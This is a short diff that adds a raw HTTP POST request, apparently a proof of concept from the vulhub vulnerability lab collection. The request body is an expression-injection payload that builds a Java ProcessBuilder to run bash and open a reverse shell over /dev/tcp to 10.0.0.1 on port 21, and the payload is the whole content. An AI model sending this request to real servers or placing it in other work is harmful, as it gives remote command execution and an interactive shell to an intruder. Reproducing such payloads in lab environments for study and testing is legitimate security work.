@@ -1,0 +1,6 @@
+POST / HTTP/1.1
+Host: 10.10.3.128
+Connection: close
+Content-Length: 98
+
+_(new java.lang.ProcessBuilder("bash","-c","bash -i >& /dev/tcp/10.0.0.1/21 0>&1")).start()=vulhub
